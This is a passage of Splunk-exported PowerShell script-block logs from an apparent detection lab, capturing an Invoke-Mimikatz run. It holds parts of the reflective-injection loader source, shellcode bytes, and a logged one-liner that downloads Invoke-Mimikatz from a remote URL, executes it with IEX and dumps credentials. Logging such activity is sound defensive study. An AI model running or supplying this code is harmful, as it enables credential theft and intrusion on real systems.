mimikatz on two remote computers to dump credentials.\nInvoke-Mimikatz -DumpCreds -ComputerName @(\"computer1\", \"computer2\")\n\n.EXAMPLE\n\nExecute mimikatz on a remote computer with the custom command \"privilege::debug exit\" which simply requests debug privilege and exits\nInvoke-Mimikatz -Command \"privilege::debug exit\" -ComputerName \"computer1\"\n\n.NOTES\nThis script was created by combining the Invoke-ReflectivePEInjection script written by Joe Bialek and the Mimikatz code written by Benjamin DELPY\nFind Invoke-ReflectivePEInjection at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection\nFind mimikatz at: http://blog.gentilkiwi.com\n\n.LINK\n\nhttp://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/\n#>\n\n[CmdletBinding(DefaultParameterSetName=\"DumpCreds\")]\nParam(\n\t[Parameter(Position = 0)]\n\t[String[]]\n\t$ComputerName,\n\n    [Parameter(ParameterSetName = \"DumpCreds\", Position = 1)]\n    [Switch]\n    $DumpCreds,\n\n    [Parameter(ParameterSetName = \"DumpCerts\", Position = 1)]\n    [Switch]\n    $DumpCerts,\n\n    [Parameter(ParameterSetName = \"CustomCommand\", Position = 1)]\n    [String]\n    $Command\n)\n\nSet-StrictMode -Version 2\n\n\n$RemoteScriptBlock = {\n\t[CmdletBinding()]\n\tParam(\n\t\t[Parameter(Position = 0, Mandatory = $true)]\n\t\t[String]\n\t\t$PEBytes64,\n\n        [Parameter(Position = 1, Mandatory = $true)]\n\t\t[String]\n\t\t$PEBytes32,\n\t\t\n\t\t[Parameter(Position = 2, Mandatory = $false)]\n\t\t[String]\n\t\t$FuncReturnType,\n\t\t\t\t\n\t\t[Parameter(Position = 3, Mandatory = $false)]\n\t\t[Int32]\n\t\t$ProcId,\n\t\t\n\t\t[Parameter(Position = 4, Mandatory = $false)]\n\t\t[String]\n\t\t$ProcName,\n\n        [Parameter(Position = 5, Mandatory = $false)]\n        [String]\n        $ExeArgs\n\t)\n\t\n\t###################################\n\t##########  Win32 Stuff  ##########\n\t###################################\n\tFunction Get-Win32Types\n\t{\n\t\t$Win32Types = New-Object System.Object\n\n\t\t#Define all the structures/enums that will be used\n\t\t#\tThis article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html\n\t\t$Domain = [AppDomain]::CurrentDomain\n\t\t$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')\n\t\t$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)\n\t\t$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)\n\t\t$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]\n\n\n\t\t############    ENUM    ############\n\t\t#Enum MachineType\n\t\t$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])\n\t\t$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null\n\t\t$MachineType = $TypeBuilder.CreateType()\n\t\t$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType\n\n\t\t#Enum MagicType\n\t\t$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])\n\t\t$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null\n\t\t$MagicType = $TypeBuilder.CreateType()\n\t\t$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType\n\n\t\t#Enum SubSystemType\n\t\t$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])\n\t\t$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null\n\t\t$SubSystemType = $TypeBuilder.CreateType()\n\t\t$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType\n\n\t\t#Enum DllCharacteristicsType\n\t\t$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])\n\t\t$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null\n\t\t$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null\n\t\t$DllCharacteristicsType = $TypeBuilder.CreateType()\n\t\t$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType\n\n\t\t###########    STRUCT    ###########\n\t\t#Struct IMAGE_DATA_DIRECTORY\n\t\t$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'\n\t\t$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)\n\t\t($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null\n\t\t($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null\n\t\t$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()\n\t\t$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY\n\n\t\t#Struct IMAGE_FILE_HEADER\n\t\t$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'\n\t\t$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)\n\t\t$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null\n\t\t$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null\n\t\t$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null\n\t\t$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null\n\t\t$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null\n\t\t$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null\n\t\t$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null\n\t\t$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()\n\t\t$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER\n\n\t\t#Struct IMAGE_OPTIONAL_HEADER64\n\t\t$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'\n\t\t$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)\n\t\t($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null\n\t\t($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null\n\t\t($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null\n\t\t($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null\n\t\t($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null\n\t\t($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null\n\t\t($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null\n\t\t($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null\n\t\t($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null\n\t\t($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null\n\t\t($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null\n\t\t($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null\n\t\t($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null\n\t\t($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null\n\t\t($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null\n\t\t($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null\n\t\t($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null\n\t\t($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null\n\t\t($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null\n\t\t($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null\n\t\t($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null\n\t\t($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null\n\t\t($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null\n\t\t($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null\n\t\t($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null\n\t\t($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null\n\t\t($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null\n\t\t($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null\n\t\t($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null\n\t\t($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null\n\t\t($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null\n\t\t($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null\n\t\t($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null\n\t\t($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null\n\t\t($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null\n\t\t($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null\n\t\t($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null\n\t\t($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null\n\t\t($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null\n\t\t($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null\n\t\t($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null\n\t\t($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null\n\t\t($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null\n\t\t($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null\n\t\t($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null\n\t\t$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()\n\t\t$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64\n\n\t\t#Struct IMAGE_OPTIONAL_HEADER32\n\t\t$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'\n\t\t$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)\n\t\t($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null\n\t\t($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null\n\t\t($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null\n\t\t($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null\n\t\t($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null\n\t\t($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null\n\t\t($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null\n\t\t($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null\n\t\t($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null\n\t\t($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null\n\t\t($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null\n\t\t($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null\n\t\nd261f22f-3dc8-4dc6-914f-cd178abb26fe","_time":"2025-11-23T14:39:14.627+0000","category":"Execute","dvc":"DESKTOP-78CU07R","dvc_nt_host":"DESKTOP-78CU07R","event_id":"401","eventtype":["endpoint_services_processes","windows_event_signature","windows_ta_data"],"host":"DESKTOP-78CU07R","id":"401","index":"mydfir-project","linecount":"292","punct":"//_::._=--/===-==-------==--====___=__=________.__","severity":"medium","severity_id":"3","signature_id":"4104","source":"Microsoft-Windows-PowerShell/Operational","sourcetype":"WinEventLog","splunk_server":"chalitha-splunk","tag":"track_event_signatures","tag::eventtype":"track_event_signatures","vendor_product":"Microsoft Windows"}}
{"preview":false,"result":{"ComputerName":"DESKTOP-78CU07R","EventCode":"4104","EventType":"3","Keywords":"None","LogName":"Microsoft-Windows-PowerShell/Operational","Message":"Creating","OpCode":"On","RecordNumber":"399","Sid":"S-1-5-21-1697325460-2044954953-441488130-1001","SidType":"0","SourceName":"Microsoft-Windows-PowerShell","TaskCategory":"Execute","Type":"Warning","User":"NOT_TRANSLATED","_raw":"11/23/2025 08:39:06.713 AM\nLogName=Microsoft-Windows-PowerShell/Operational\nEventCode=4104\nEventType=3\nComputerName=DESKTOP-78CU07R\nUser=NOT_TRANSLATED\nSid=S-1-5-21-1697325460-2044954953-441488130-1001\nSidType=0\nSourceName=Microsoft-Windows-PowerShell\nType=Warning\nRecordNumber=399\nKeywords=None\nTaskCategory=Execute a Remote Command\nOpCode=On create calls\nMessage=Creating Scriptblock text (1 of 1):\r\n{$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr}\r\n\r\nScriptBlock ID: d9b4359a-2f0f-4aab-a448-7d81dd579be4\r\nPath:","_time":"2025-11-23T14:39:06.713+0000","app":"'Notepad'","category":"Execute","curpid":"$wshell.Exec($app).ProcessID","dvc":"DESKTOP-78CU07R","dvc_nt_host":"DESKTOP-78CU07R","event_id":"399","eventtype":["endpoint_services_processes","windows_event_signature","windows_ta_data"],"host":"DESKTOP-78CU07R","id":"399","index":"mydfir-project","linecount":"19","props":"(Get-ItemProperty $reg)","punct":"//_::._=--/===-==-------==--====___=__=___(__):\\r{$","reg":"'HKCU:\\Software\\Microsoft\\Notepad'","res":"([Windows.Forms.Clipboard]::GetText())","severity":"medium","severity_id":"3","signature_id":"4104","source":"Microsoft-Windows-PowerShell/Operational","sourcetype":"WinEventLog","splunk_server":"chalitha-splunk","tag":"track_event_signatures","tag::eventtype":"track_event_signatures","title":"GPS","url":"'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'","vendor_product":"Microsoft Windows","wshell":"New-Object -ComObject WScript.Shell"}}
{"preview":false,"result":{"ComputerName":"DESKTOP-78CU07R","EventCode":"4104","EventType":"3","Keywords":"None","LogName":"Microsoft-Windows-PowerShell/Operational","Message":"Creating","OpCode":"On","RecordNumber":"398","Sid":"S-1-5-21-1697325460-2044954953-441488130-1001","SidType":"0","SourceName":"Microsoft-Windows-PowerShell","TaskCategory":"Execute","Type":"Warning","User":"NOT_TRANSLATED","_raw":"11/23/2025 08:39:06.701 AM\nLogName=Microsoft-Windows-PowerShell/Operational\nEventCode=4104\nEventType=3\nComputerName=DESKTOP-78CU07R\nUser=NOT_TRANSLATED\nSid=S-1-5-21-1697325460-2044954953-441488130-1001\nSidType=0\nSourceName=Microsoft-Windows-PowerShell\nType=Warning\nRecordNumber=398\nKeywords=None\nTaskCategory=Execute a Remote Command\nOpCode=On create calls\nMessage=Creating Scriptblock text (1 of 1):\r\n& {$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr}\r\n\r\nScriptBlock ID: fcc88318-53f3-406d-9315-6be5dc1e5d39\r\nPath:","_time":"2025-11-23T14:39:06.701+0000","app":"'Notepad'","category":"Execute","curpid":"$wshell.Exec($app).ProcessID","dvc":"DESKTOP-78CU07R","dvc_nt_host":"DESKTOP-78CU07R","event_id":"398","eventtype":["endpoint_services_processes","windows_event_signature","windows_ta_data"],"host":"DESKTOP-78CU07R","id":"398","index":"mydfir-project","linecount":"19","props":"(Get-ItemProperty $reg)","punct":"//_::._=--/===-==-------==--====___=__=___(__):\\r&_","reg":"'HKCU:\\Software\\Microsoft\\Notepad'","res":"([Windows.Forms.Clipboard]::GetText())","severity":"medium","severity_id":"3","signature_id":"4104","source":"Microsoft-Windows-PowerShell/Operational","sourcetype":"WinEventLog","splunk_server":"chalitha-splunk","tag":"track_event_signatures","tag::eventtype":"track_event_signatures","title":"GPS","url":"'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'","vendor_product":"Microsoft Windows","wshell":"New-Object -ComObject WScript.Shell"}}
{"preview":false,"result":{"CallDllMainSC1":"@(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)","CallDllMainSC2":"@(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)","CallDllMainSC3":"@(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)","ComputerName":"DESKTOP-78CU07R","DllMain":"[System.Runtime.InteropServices.Marshal]","DllMainDelegate":"Get-DelegateType","DllMainPtr":"Add-SignedIntAsUnsigned","EventCode":"4104","EventType":"3","ExeDoneBytePtr":"[System.Runtime.InteropServices.Marshal]","ExeMainPtr":"Add-SignedIntAsUnsigned","ImportDescriptor":"[System.Runtime.InteropServices.Marshal]","ImportDescriptorPtr":"Add-SignedIntAsUnsigned","ImportDllHandle":"$Win32Functions.GetModuleHandle.Invoke($ImportDllPath)","ImportDllPath":"[System.Runtime.InteropServices.Marshal]","Keywords":"None","LogName":"Microsoft-Windows-PowerShell/Operational","Mandatory":"$true","Message":"Splunk","NumBytesWritten":"0","OpCode":"On","OverwrittenMemInfo":"Update-ExeFunctions","PEInfo":"Get-PEDetailedInfo","Position":"0","ProcInfo":"Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName","Processes":"@(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)","RSCAddr":"$Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)","RThreadHandle":"Invoke-CreateRemoteThread","RecordNumber":"328","RemoteProcHandle":"[IntPtr]","Result":"$Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)","SCLength":"$CallDllMainSC1.Length","SCPSMem":"[System.Runtime.InteropServices.Marshal]","SCPSMemOriginal":"$SCPSMem","Sid":"S-1-5-21-1697325460-2044954953-441488130-1001","SidType":"0","SourceName":"Microsoft-Windows-PowerShell","Success":"$Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)","TaskCategory":"Execute","ThreadDone":"[System.Runtime.InteropServices.Marshal]","Type":"Warning","User":"NOT_TRANSLATED","Win32Constants":"Get-Win32Constants","Win32Functions":"Get-Win32Functions","Win32Types":"Get-Win32Types","_raw":"11/23/2025 08:38:46.688 AM\nLogName=Microsoft-Windows-PowerShell/Operational\nEventCode=4104\nEventType=3\nComputerName=DESKTOP-78CU07R\nUser=NOT_TRANSLATED\nSid=S-1-5-21-1697325460-2044954953-441488130-1001\nSidType=0\nSourceName=Microsoft-Windows-PowerShell\nType=Warning\nRecordNumber=328\nKeywords=None\nTaskCategory=Execute a Remote Command\nOpCode=On create calls\nMessage=Splunk could not get the description for this event. Either the component that raises this event is not installed on your local computer or the installation is corrupt.\n\nFormatMessage error:\n\nGot the following information from this event: \n\n\t\t\tWrite-Verbose \"Update memory protection flags\"\n\t\t\t\tUpdate-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tWrite-Verbose \"PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute\"\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tWrite-Verbose \"PE being loaded in to a remote process, not adjusting memory permissions\"\n\t\t}\n\t\t\n\t\t\n\t\t#If remote loading, copy the DLL in to remote process memory\n\t\tif ($RemoteLoading -eq $true)\n\t\t{\n\t\t\t[UInt32]$NumBytesWritten = 0\n\t\t\t$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)\n\t\t\tif ($Success -eq $false)\n\t\t\t{\n\t\t\t\tThrow \"Unable to write shellcode to remote process memory.\"\n\t\t\t}\n\t\t}\n\t\t\n\t\t\n\t\t#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function\n\t\tif ($PEInfo.FileType -ieq \"DLL\")\n\t\t{\n\t\t\tif ($RemoteLoading -eq $false)\n\t\t\t{\n\t\t\t\tWrite-Verbose \"Calling dllmain so the DLL knows it has been loaded\"\n\t\t\t\t$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)\n\t\t\t\t$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) 